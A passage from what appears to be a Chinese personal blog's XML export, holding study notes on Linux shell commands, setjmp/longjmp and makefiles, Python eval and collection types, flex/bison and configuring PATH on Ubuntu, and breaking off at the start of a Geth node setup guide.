<li><strong>cd</strong>，切换到主目录</li>
<li><strong>cd -</strong>，切换回前一个工作目录</li>
<li><strong>cd ~user_name</strong>，切换到用户名的主目录</li>
</ul>
</li>
</ol>
<h2 id="探索Linux系统时遇到的命令"><a href="#探索Linux系统时遇到的命令" class="headerlink" title="探索Linux系统时遇到的命令"></a>探索Linux系统时遇到的命令</h2><h3 id="重探ls命令"><a href="#重探ls命令" class="headerlink" title="重探ls命令"></a>重探ls命令</h3><ol>
<li><p><strong>ls /usr</strong>，指定列出某目录下的内容</p>
</li>
<li><p><strong>ls ~ /usr</strong>，指定列出多目录下的内容</p>
</li>
<li><p><strong>ls -l</strong>显示时间等更详细的内容</p>
</li>
<li><p>选项与参数</p>
<ul>
<li><p>大致格式，<strong>command -options arguments</strong>，所以上面的l就类似于一个选项</p>
</li>
<li><p>这些选项可以直接组合，例如<strong>ls -lt</strong>，其中t选项用来依照文件修改时间对输出结果进行排序</p>
</li>
<li><p>也可以在后面加入长选项<strong>—reverse</strong>，可以以降序排列输出结果</p>
</li>
<li><p>下面的表格给出了常用的ls命令选项</p>
</li>
<li><p>| 选项                | 描述                               |<br>| —————————- | ————————————————— |<br>| -a,—all            | 列出所有的文件包括隐藏文件         |<br>| -A,—almost-all     | 不列出.和..                        |<br>| -d,-directory       | 列出该目录的详细信息               |<br>| -F,—classify       | 在每个列出的名称后加入类型指示符   |<br>| -h,—human-readable | 不以字节为单位显示长格式的输出结果 |<br>| -l                  | 以长格式显示输出                   |<br>| -r,—reverse        | 降序排列，而通常ls以升序排列       |<br>| -S                  | 按文件大小输出                     |</p>
</li>
</ul>
</li>
</ol>
<h3 id="file命令"><a href="#file命令" class="headerlink" title="file命令"></a>file命令</h3><p>​    主要用来确定文件的类型，<strong>file filename</strong>，万物皆文件！</p>
<h3 id="less命令"><a href="#less命令" class="headerlink" title="less命令"></a>less命令</h3><p>​    该命令可以用来查看文本文件，即<strong>less filename</strong>，进入文件后有一些比较好用的命令</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>命令</th>
<th>操作</th>
</tr>
</thead>
<tbody>
<tr>
<td>b</td>
<td>后翻一页</td>
</tr>
<tr>
<td>空格</td>
<td>前翻一页</td>
</tr>
<tr>
<td>上方向键</td>
<td>向后一行</td>
</tr>
<tr>
<td>下方向键</td>
<td>向前一行</td>
</tr>
<tr>
<td>G</td>
<td>跳转到文件末尾</td>
</tr>
<tr>
<td>g或1G</td>
<td>跳转到文件开头</td>
</tr>
<tr>
<td>/characters</td>
<td>向前搜索</td>
</tr>
<tr>
<td>n</td>
<td>重复上一次搜索</td>
</tr>
<tr>
<td>h</td>
<td>显示帮助信息</td>
</tr>
<tr>
<td>q</td>
<td>退出文件或者说less命令</td>
</tr>
</tbody>
</table>
</div>
<h3 id="另外的一些知识"><a href="#另外的一些知识" class="headerlink" title="另外的一些知识"></a>另外的一些知识</h3><ol>
<li>关于复制粘贴，使用鼠标的话，双击可以复制文件名，单击中键可以粘贴到命令中</li>
</ol>
<h2 id="操作文件和目录"><a href="#操作文件和目录" class="headerlink" title="操作文件和目录"></a>操作文件和目录</h2><p>​    这部分将会讲述很多非常灵活与使用的东西</p>
<h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><p>​    使用Shell过程中要使用非常多的文件名，所以就提供了一种特殊字符，即通配符，用来进行匹配，感觉就跟正则表达式差不多</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>通配符</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>*</td>
<td>匹配任意多个字符</td>
</tr>
<tr>
<td>?</td>
<td>匹配任意单个字符</td>
</tr>
<tr>
<td>[characters]</td>
<td>匹配字符集合characters中的任意单个字符</td>
</tr>
<tr>
<td>[!characters]</td>
<td>匹配不属于该字符集合中的任意单个字符</td>
</tr>
<tr>
<td>[[:class:]]</td>
<td>匹配属于字符类class中的任意单个字符</td>
</tr>
</tbody>
</table>
</div>
<p>​    下面是一些常用的字符类</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>字符类</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>[:alnum:]</td>
<td>任意匹配单个字母数字字符</td>
</tr>
<tr>
<td>[:alpha:]</td>
<td>任意匹配单个字母</td>
</tr>
<tr>
<td>[:digit:]</td>
<td>任意匹配单个数字</td>
</tr>
<tr>
<td>[:lower:]</td>
<td>任意匹配单个小写字母</td>
</tr>
<tr>
<td>[:upper:]</td>
<td>任意匹配单个大写字母</td>
</tr>
</tbody>
</table>
</div>
<p>​    在GUI中也可以使用通配符</p>
<h3 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h3><ol>
<li><p>mkdir，在当前目录下创建新目录，并且可以一次创建多个</p>
</li>
<li><p>cp，主要用来复制，有两种用法</p>
<ul>
<li><p><strong>cp item1 item2</strong>，将item1复制到item2</p>
</li>
<li><p><strong>cp item… directory</strong>，将多个文件或目录item复制到directory中</p>
</li>
<li><p>下表给出了cp命令中常用的选项</p>
</li>
<li><p>| 选项             | 含义                                                         |<br>| ———————— | —————————————————————————————— |<br>| -a,—archive     | 复制文件和目录及其包括所有权与权限在内的所有属性             |<br>| -i,—interactive | 在覆盖已有文件之前，提醒用户确认                             |<br>| -r,—recursive   | 递归复制目录及其内容                                         |<br>| -u,—update      | 从一个目录复制到另外一个目录时，只复制目标目录中不存在或更新的文件 |<br>| -v,—verbose     | 在进行复制时显示相关的信息                                   |</p>
</li>
</ul>
</li>
<li><p>mv，用于移动和重命名文件，和cp命令的用法大同小异</p>
<ul>
<li><strong>mv item1 item2</strong></li>
<li><strong>mv item… directory</strong></li>
<li>他的选项相比于cp命令，少了-a和-i</li>
</ul>
</li>
<li><p>rm，删除文件和目录</p>
<ul>
<li><p><strong>rm item…</strong></p>
</li>
<li><p>常用选项如下</p>
</li>
<li><p>| 选项             | 含义                         |<br>| ———————— | —————————————— |<br>| -i,—interactive | 请求用户确认                 |<br>| -r,—recursive   | 递归删除目录                 |<br>| -f,—force       | 忽略不存在的文件             |<br>| -v,—verbose     | 在执行删除操作时显示相关信息 |</p>
</li>
<li><p>要小心使用rm命令，因为Linux并没有提供还原的命令</p>
</li>
</ul>
</li>
<li><p>ln，用来创建硬链接和符号链接</p>
<ul>
<li><strong>ln file link</strong>，创建硬链接</li>
<li><strong>ln -s item link</strong>，创建符号链接</li>
</ul>
</li>
</ol>
<p><strong><em>这里说一下两种链接，硬链接有两个重要限制，一是不能引用所在文件系统之外的文件，即不能跨物理设备，二是不能引用目录。而符号链接克服了硬链接的限制，创建了一种特别类型的文件，内含一个指针，和Windows下的快捷方式比较像，就和引用指针比较类似，文件至少有一个硬链接，因为文件名都是通过硬链接创建的</em></strong></p>
<p>​    另外对于判断硬链接和文件其实是同一个这个问题，其实可以用<strong>ls -i</strong>命令，系统为i结点分配了一系列的磁盘块，然后将i结点和名称关联在一起，这个命令可以显示这种信息</p>
<p>​    <strong><em>关于软硬连接这方面以后有时间了要再看看</em></strong></p>
]]></content>
      <categories>
        <category>Linux</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux系统编程（一）</title>
    <url>/2021/10/04/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h1 id="名词汇总"><a href="#名词汇总" class="headerlink" title="名词汇总"></a>名词汇总</h1><ol>
<li><p>静态链接，共享库，该方法导入所有必要库函数和数据，文件大。</p>
</li>
<li><p>动态链接，动态链接库（DLL），文件小</p>
</li>
<li><p>关于可执行文件格式，有二进制可执行平面文件，a.out可执行文件，ELF可执行文件</p>
</li>
<li><p>a.out文件包括文件头/代码段/数据段/符号表</p>
</li>
<li><p>程序执行过程：首先读取文件头，确定所需总内存大小，从总大小中分配一个内存区给执行映像，清除bss段（这里面存放着静态变量和全局变量，这也是为什么他们从0开始），然后程序放弃旧映像执行新映像。最后执行Crt0.o，调用主函数</p>
</li>
<li><p>程序正常终止时，main()函数最终返回到ctr0.o，然后调用库函数exit(0)终止进程，<strong>或许这也是为什么如果我们自己调用exit()显式的是异常终止</strong></p>
</li>
<li><p>程序异常终止时，内核产生信号将其传递给进程，然后进程会终止</p>
</li>
<li><p>在函数调用过程中，对某函数可见的栈区称为该函数的<strong>栈帧</strong>，可以通过long jump在某个函数结束后返回到调用序列较早的某个函数，头文件是<strong><setjmp.h></setjmp.h></strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line">jmp_buf env;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">A</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">B</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> r,a=<span class="number">100</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;call setjmp to save envirenment\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>((r=setjmp(env))==<span class="number">0</span>)&#123;<span class="comment">//setjmp()函数将当前执行函数保存在jmp_buf结构体中，返回0</span></span><br><span class="line">    A();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;normal&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;back to main() via long jump, r=%d a=%d\n&quot;</span>,r,a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">A</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;enter A()\n&quot;</span>);</span><br><span class="line">  B();<span class="comment">//正常进入B函数</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;exit A()\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">B</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;enter B()\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;long jump? (Y|n) &quot;</span>);<span class="comment">//如果选择跳跃，则不会返回main函数</span></span><br><span class="line">  <span class="keyword">if</span>(getchar()==<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">    longjmp(env,<span class="number">1234</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;exit B()\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>long jump可以用来终止调用序列中的某个函数，从而使得从先前保存的已知环境中恢复执行</p>
</li>
<li><p>64位堆栈使用有点不同，它将会优先使用6个寄存器，然后多余的变量会被保存在堆栈中</p>
</li>
<li><p>对于汇编代码的一些说明，首先由gcc生成的汇编代码由三部分组成，即入口代码（prolog，用来建立栈帧，在堆栈上分配局部变量和工作空间）、函数体代码（在AX寄存器中执行带有返回值的函数任务）、退出代码（epilog，释放堆栈，返回到调用者）</p>
</li>
<li><p>另外就是可以照葫芦画瓢写一点汇编代码，常用的有像mov指令，用来传送数据，再比如call指令，可以用来调用外部函数</p>
</li>
<li><p>关于链接库，就是用来存放预编译的目标代码的地方，关于创建链接库的方法，此处先略</p>
</li>
<li><p>然后就是听了很久但是从没用过的makefile，一个make文件由一系列目标项、依赖项和规则组成。目标项通常是要创建或更新的文件。然后目前来说，makefile就是用来给定编译顺序的一份文件</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">make -f mk1</span><br></pre></td></tr></table></figure>
<p>然后就是make中的宏，$用来表示替换</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CC = gcc</span><br><span class="line">OFLAGS = -Wall</span><br><span class="line">OBJS = t.o mtsum.o</span><br><span class="line">INCLUDE = -Ipath</span><br><span class="line"><span class="section">myt: type.h <span class="variable">$(OBJS)</span></span></span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> -o t <span class="variable">$(OBJS)</span> <span class="variable">$(INCLUDE)</span></span><br></pre></td></tr></table></figure>
<p> 这本书里的makefile把人劝退了，这里在CSDN上找到了一个看起来还不错的文章，后面摘一下</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Linux</category>
        <category>系统编程</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>系统编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Python在数学建模中的应用（一）</title>
    <url>/2021/10/12/Python%E5%9C%A8%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h1 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h1><p>​    语法格式如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(expression, <span class="built_in">globals</span>=<span class="literal">None</span>, <span class="built_in">locals</span>=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure>
<p>​    用于执行一个字符串表达式并返回该表达式的值，第一个参数就是表达式，第二个参数必须是<strong>字典</strong>，第三个参数掌控局部的命名空间，下面给几个例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">10</span>;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(<span class="string">&quot;a+1&quot;</span>))</span><br></pre></td></tr></table></figure>
<p>​    输出为11，因为只指定了表达式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">10</span>;</span><br><span class="line">g=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">4</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(<span class="string">&quot;a+1&quot;</span>,g))</span><br></pre></td></tr></table></figure>
<p>​    输出为5，因为globals参数制定了命名空间</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">10</span></span><br><span class="line">b=<span class="number">20</span></span><br><span class="line">c=<span class="number">30</span></span><br><span class="line">g=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">6</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">8</span>&#125;</span><br><span class="line">t=&#123;<span class="string">&#x27;b&#x27;</span>:<span class="number">100</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">10</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(<span class="string">&#x27;a+b+c&#x27;</span>,g,t))</span><br></pre></td></tr></table></figure>
<p>​    这里三个参数都有，注意到字典g和t中都有b变量的取值，这个时候优先使用locals中的变量</p>
<h1 id="复合数据类型"><a href="#复合数据类型" class="headerlink" title="复合数据类型"></a>复合数据类型</h1><ol>
<li><p>首先是列表，下面给出一些列表的操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">b=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">a.append(<span class="number">4</span>)<span class="comment">#末尾插入一个</span></span><br><span class="line">a.extend([<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>])<span class="comment">#末尾插入若干个</span></span><br><span class="line">a.insert(<span class="number">1</span>,<span class="number">10</span>)<span class="comment">#插入</span></span><br><span class="line">a.pop()<span class="comment">#删除末尾</span></span><br><span class="line">a.pop(<span class="number">4</span>)<span class="comment">#删除索引为4的</span></span><br><span class="line">a.remove(<span class="number">2</span>)<span class="comment">#根据值删除元素</span></span><br><span class="line">a.clear()<span class="comment">#清空列表</span></span><br><span class="line">a.index(<span class="number">2</span>) <span class="comment">#根据值查询，返回索引，没找到报错</span></span><br><span class="line">a.count(<span class="number">2</span>) <span class="comment">#查询某个值出现的次数</span></span><br><span class="line">a+b <span class="comment">#连接两个列表</span></span><br><span class="line">a*<span class="number">2</span> <span class="comment">#列表重复两次</span></span><br><span class="line"><span class="built_in">len</span>(a) <span class="comment">#返回a的长度</span></span><br><span class="line">a.sort() <span class="comment">#升序排列</span></span><br><span class="line">c=<span class="built_in">sorted</span>(b) <span class="comment">#升序排列</span></span><br><span class="line">c=<span class="built_in">sorted</span>(b,reverse=<span class="literal">True</span>) <span class="comment">#降序排列</span></span><br><span class="line">a.reverse() <span class="comment">#反转a</span></span><br></pre></td></tr></table></figure>
<p>然后就是可以使用切片索引，和matlab差不多，但是Python的切片索引步长是最后一个参数</p>
</li>
<li><p>然后是元组，是一种不可修改的列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t=<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line">t=(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">singlet=<span class="number">1</span>,<span class="comment">#逗号说明它是一个元组</span></span><br></pre></td></tr></table></figure>
<p>不修改列表的所有操作都可以用到元组上面</p>
</li>
<li><p>字典，键值对，和列表差不多</p>
</li>
<li><p>集合，其中没有重复元素</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="built_in">set</span>(<span class="string">&#x27;abcdea&#x27;</span>)</span><br><span class="line">a.add(<span class="number">1</span>)</span><br><span class="line">a.remove(<span class="number">1</span>)</span><br><span class="line">a.discard(<span class="number">1</span>)<span class="comment">#按值删除，但是如果没有不会报错</span></span><br><span class="line">a.clear()</span><br><span class="line">a.copy()</span><br><span class="line">a.pop()<span class="comment">#删除第一个元素</span></span><br><span class="line">a.update(&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;)<span class="comment">#合并两个集合并赋给a</span></span><br><span class="line">a.difference(&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;)<span class="comment">#差集，也可以直接用减号</span></span><br><span class="line">a.intersection(&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;) <span class="comment">#交集，可以用&amp;</span></span><br><span class="line">a.symmetric_difference(&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;) <span class="comment">#对称差，可以用^</span></span><br><span class="line">a.union(&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;) <span class="comment">#并集，也可以用|</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="序列的实用操作"><a href="#序列的实用操作" class="headerlink" title="序列的实用操作"></a>序列的实用操作</h1><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><ol>
<li>str()，将数值数据转化成字符串</li>
<li>这个书上也提到了<strong>eval()</strong>函数，他这里给出的作用是把字符串的内容作为对应的Python语句来执行</li>
<li>find()，用来查找子串，返回子串最左端的索引</li>
<li>split()，用来分割字符串，参数为提供分割符，如果不提供，则以空格作为分割符</li>
<li>strip()，如果不提供参数，去除字符串开头结尾的空格</li>
<li>算了还是不列举了，自己看一下书然后用到的时候再说吧。</li>
</ol>
<h2 id="序列"><a href="#序列" class="headerlink" title="序列"></a>序列</h2><ol>
<li><p>突然看到了之前自己在TLA+学到的一个东西，即reduce()函数，两个参数分别为函数和一个可迭代对象，首先将参数二前两个值作为函数参数，运算得到的值和第三个值一起传给函数，就这样一直进行下去</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">reduce(<span class="keyword">lambda</span> x,y: x*y,<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>))</span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
      <categories>
        <category>数学</category>
        <category>数学建模</category>
      </categories>
      <tags>
        <tag>数学</tag>
        <tag>数学建模</tag>
      </tags>
  </entry>
  <entry>
    <title>flex&amp;bison</title>
    <url>/2021/11/05/flex/</url>
    <content><![CDATA[<h1 id="大致工作模式"><a href="#大致工作模式" class="headerlink" title="大致工作模式"></a>大致工作模式</h1><p>​    对于语法分析，主要包括词法分析和语法分析两个部分，前者用来将输入分割成一个个有意义的词块，即为<strong>记号（token）</strong>，后者用来确定这些记号彼此之间如何关联。</p>
<p>​    例如表达式<strong>alpha=beta+gamma</strong>，词法分析器将其分割为alpha、=、beta、+、gamma、；这些记号，而语法分析确定了beta+gamma是一个表达式，其值被赋给alpha</p>
<h1 id="词法分析flex"><a href="#词法分析flex" class="headerlink" title="词法分析flex"></a>词法分析flex</h1><p>​    flex文件主要包含三个部分，每部分之间用<strong>%%</strong>隔开，第一个部分包含声明和选项设置，其中<strong>%{</strong>和<strong>%}</strong>之间的部分被照抄到C文件开头部分；第二个部分包含模式和对应的动作，模式一般用正则表达式描述，对应的动作就是C代码，为了防止出错，尽量放在大括号里；最后一部分也是C代码，是主程序。</p>
<p>​    当程序需要一个记号的时候，会调用yylex()来读取一小部分的的输入然后返回相应的记号，这时候每个记号都由记号编号和记号值组成，记号编号是随机确定的，bison在创建语法分析器的时候自动从258开始指派</p>
]]></content>
      <categories>
        <category>编译</category>
        <category>词法分析和语法分析</category>
      </categories>
      <tags>
        <tag>编译</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux配置环境变量</title>
    <url>/2022/03/07/Linux%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/</url>
    <content><![CDATA[<h1>前言</h1>
<p>​	昨天晚上在配置Geth环境的时候突然发现像ls这种基本的命令竟然都找不到了，意识到配置环境的时候可能把/usr/bin这个目录给冲掉了，仔细想想自己好像一直都是照猫画虎的配环境，也不知道其中的命令的一些缘由，所以今天也是尽快找了一些相关的教程，总结一下配置环境的常见问题。参考https://www.cnblogs.com/youyoui/p/10680329.html</p>
<h1>环境配置</h1>
<p>​	比如我现在就是要去配置/home/usrname/，使用的系统是Ubuntu20.04。</p>
<h2 id="读取环境变量"><a class="header-anchor" href="#读取环境变量">¶</a>读取环境变量</h2>
<p>​	主要有两种读取环境变量的方法</p>
<ul>
<li><code>export</code>命令显示当前系统定义的所有环境变量，执行出来的结果一般都会很长。</li>
<li><code>echo $PATH</code>命令显示当前的PATH环境变量，执行结果一般如下</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326163741090.png" alt="image-20220326163741090"></p>
<p>​	<code>PATH</code>变量主要就是定义了运行命令的查找路径，用冒号分隔不同的路径，在使用<code>export</code>定义的时候这个冒号可加可不加。</p>
<h2 id="Linux配置环境变量的几种方法"><a class="header-anchor" href="#Linux配置环境变量的几种方法">¶</a>Linux配置环境变量的几种方法</h2>
<h3 id="export-PATH"><a class="header-anchor" href="#export-PATH">¶</a>export PATH</h3>
<p>​	可以使用<code>export</code>直接修改<code>PATH</code>的值，如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export PATH=/home/username:$PATH</span><br><span class="line"><span class="meta">#</span><span class="bash"> 也可以把PATH放在前面</span></span><br><span class="line">export PATH=$PATH:/home/username</span><br></pre></td></tr></table></figure>
<p>​	注意该种方式立刻生效，不需要使用<code>source</code>命令，但是只对当前终端有效，也只对当前账户有效。</p>
<p>​	注意，使用<code>$PATH</code>是为了保存之前的命令，如果没有这个，新加入的路径将会覆盖之前的PATH，我也正是因为直接这样搞了，所以/usr/bin下的命令全都找不到了</p>
<h3 id="vim-bashrc"><a class="header-anchor" href="#vim-bashrc">¶</a>vim ~/.bashrc</h3>
<p>​	通过修改<code>~/.bashrc</code>文件来进行配置，当然如果用了zsh等其它的shell的话，需要修改对应的文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim ~/.bashrc</span><br><span class="line"><span class="meta">#</span><span class="bash"> 在最后一行加上</span></span><br><span class="line">export PATH=$PATH:/home/username</span><br></pre></td></tr></table></figure>
<p>​	注意该命令需要使用<code>source ~/.bashrc</code>来使其生效，并且永久有效，但是只对当前用户有效。</p>
<h3 id="vim-bash-profile"><a class="header-anchor" href="#vim-bash-profile">¶</a>vim ~/.bash_profile</h3>
<p>​	这个和上面的那个就是类似的，不管是各种范围还是什么都是类似的。</p>
<p>​	不过需要注意的是，有的系统可能没有这个文件，比如我的，这种情况下可以编辑~/.profile或者新建一个这个文件。</p>
<h3 id="vim-etc-bashrc"><a class="header-anchor" href="#vim-etc-bashrc">¶</a>vim /etc/bashrc</h3>
<p>​	这种方法是修改系统配置，需要管理员权限或者对该文件的写入权限。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod -v u+w /etc/bashrc</span><br><span class="line">vim /etc/bashrc</span><br><span class="line">export PATH=$PATH:/home/username</span><br></pre></td></tr></table></figure>
<p>​	也需要使用<code>source</code>命令使其有效，这个就是永久有效的，并且对于所有的用户都有效。</p>
<p><strong>注：之前没怎么用过chmod命令，需要给权限都是直接sudo，可以参考https://www.runoob.com/linux/linux-comm-chmod.html了解一下这个给权限的命令</strong></p>
<h3 id="vim-etc-profile"><a class="header-anchor" href="#vim-etc-profile">¶</a>vim /etc/profile</h3>
<p>​	这种方法和上面那个完全一样的，就不再多说了</p>
<h3 id="vim-etc-environment"><a class="header-anchor" href="#vim-etc-environment">¶</a>vim /etc/environment</h3>
<p>​	这种方法和上面那个也是完全一样的，也不再多说了。</p>
<h1>环境变量加载原理</h1>
<h2 id="环境变量的分类"><a class="header-anchor" href="#环境变量的分类">¶</a>环境变量的分类</h2>
<p>​	可以简单地分成用户自定义的环境变量以及系统级别的环境变量</p>
<ul>
<li>用户级别环境变量定义文件：<code>~/.bashrc</code>，<code>~/.profile</code>（也有的系统是<code>~/.bashrc_profile</code>）</li>
<li>系统级别环境变量定义文件：<code>/etc/bashrc</code>，<code>/etc/profile</code>（也有的系统是<code>/etc/bash_profile</code>），<code>/etc/environment</code></li>
</ul>
<p>​    在用户环境变量中，系统会首先读取<code>~/.bashrc_profile</code>（或者<code>~/.profile</code>）文件，如果没有该文件就读取<code>~/.bash_login</code>，然后根据这些文件中的内容读取<code>~/.bashrc</code></p>
<h2 id="环境变量加载顺序"><a class="header-anchor" href="#环境变量加载顺序">¶</a>环境变量加载顺序</h2>
<p>​	在我参考的博客中，给出了测试环境变量加载顺序的一个方法，即在所有相关文件中都定义一个相同的环境变量，然后观察它的值即可。</p>
<p>​	经过测试，加载环境变量的顺序大概如下</p>
<p>​	<strong>系统环境变量-&gt;用户自定义环境变量</strong></p>
<p>​	这个是可以根据相关文件的内容推断的，比如对于<code>/etc/profile</code>，打开之后，文件内容如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> /etc/profile: system-wide .profile file <span class="keyword">for</span> the Bourne shell (sh(1))</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).</span></span><br><span class="line"></span><br><span class="line">if [ &quot;$&#123;PS1-&#125;&quot; ]; then</span><br><span class="line">  if [ &quot;$&#123;BASH-&#125;&quot; ] &amp;&amp; [ &quot;$BASH&quot; != &quot;/bin/sh&quot; ]; then</span><br><span class="line">    # The file bash.bashrc already sets the default PS1.</span><br><span class="line">    # PS1=&#x27;\h:\w\$ &#x27;</span><br><span class="line">    if [ -f /etc/bash.bashrc ]; then</span><br><span class="line">      . /etc/bash.bashrc</span><br><span class="line">    fi</span><br><span class="line">  else</span><br><span class="line">    if [ &quot;`id -u`&quot; -eq 0 ]; then</span><br><span class="line">      PS1=&#x27;# &#x27;</span><br><span class="line">    else</span><br><span class="line">      PS1=&#x27;$ &#x27;</span><br><span class="line">    fi</span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [ -d /etc/profile.d ]; then</span><br><span class="line">  for i in /etc/profile.d/*.sh; do</span><br><span class="line">    if [ -r $i ]; then</span><br><span class="line">      . $i</span><br><span class="line">    fi</span><br><span class="line">  done</span><br><span class="line">  unset i</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p>​	可以看出来它检查了<code>/etc/bash.bashrc</code>文件。</p>
<p>​	类似的可以依次查看这些文件。</p>
<h2 id="小技巧"><a class="header-anchor" href="#小技巧">¶</a>小技巧</h2>
<p>​	可以在<code>~/.profile</code>文件中使用<code>alias</code>命令定义一些变量的别名，如</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alias rm=&quot;rm -i&quot;</span><br></pre></td></tr></table></figure>
<p>​	这样每次使用<code>rm</code>的时候都相当于使用了<code>rm -i</code></p>
]]></content>
      <categories>
        <category>Linux</category>
        <category>基本知识</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建以太坊全节点</title>
    <url>/2022/03/06/geth%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1>概述</h1>
<p>​	目前主要是通过官方给的教程来搭建这么一个结点，不过其实我个人目前对以太坊结点的理解还没有很深刻，<s>甚至有可能完全错误</s>，目前感觉就是装一下Geth，然后用Geth开启一个账户就行了？</p>
<h1>安装Geth等组件</h1>
<p>​	在安装Geth之前，首先配置一个go语言的运行环境，这个我之前已经配过，就不再赘述了。</p>
<p>​	Geth主要有如下三种安装方法：</p>
<ol>
<li>
<p>直接在<a href="https://geth.ethereum.org">官网</a>下载可执行文件</p>
</li>
<li>
<p>Ubuntu用户可以在线安装。</p>
